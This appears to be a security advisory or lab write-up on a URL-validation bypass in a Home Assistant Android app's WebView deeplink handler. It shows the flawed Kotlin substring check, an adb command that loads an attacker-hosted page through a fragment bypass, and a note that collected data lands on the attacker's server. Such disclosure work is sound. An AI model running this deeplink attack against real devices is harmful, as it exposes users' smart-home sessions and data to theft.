# 2.2.1 — Insufficient URL Source Validation

## Vulnerability
The `isTrustedUrl()` method uses a simple substring check (`url.contains("home-assistant.io")`) to validate whether a URL belongs to a trusted domain. This can be bypassed by appending `#home-assistant.io` or `?x=home-assistant.io` to any attacker-controlled URL.

## Affected Code
```kotlin
// WebViewActivity.kt
private fun isTrustedUrl(url: String): Boolean {
    return url.contains("home-assistant.io")  // VULN: substring match
}

private fun handleDeeplinkIntent(intent: Intent) {
    if (intent.data != null && intent.data?.scheme == "homeassistant" && intent.data?.host == "webview") {
        val urlParam = intent.data?.getQueryParameter("url")
        if (!urlParam.isNullOrBlank()) {
            if (isTrustedUrl(urlParam)) {
                lifecycleScope.launch {
                    registerExternalAppV1()
                    webView.loadUrl(urlParam)  // Loads attacker URL
                }
            }
        }
    }
}
```

## Exploit
1. Start EXP server: `python server.py`
2. Trigger deeplink: 
   ```
   adb shell am start -a android.intent.action.VIEW -d "homeassistant://webview?url=http://<your-ip>:8000/exp/2.2.1.html%23home-assistant.io"
   ```
3. The `#home-assistant.io` fragment bypasses the `contains()` check
4. WebView loads the attacker page with ExternalApp bridge enabled

## Verification
Check `received/` directory for collected data files.

## Fixed Version
In the fix, `isTrustedUrl` should validate the full hostname using `java.net.URI` or regex with proper TLD boundary checking.
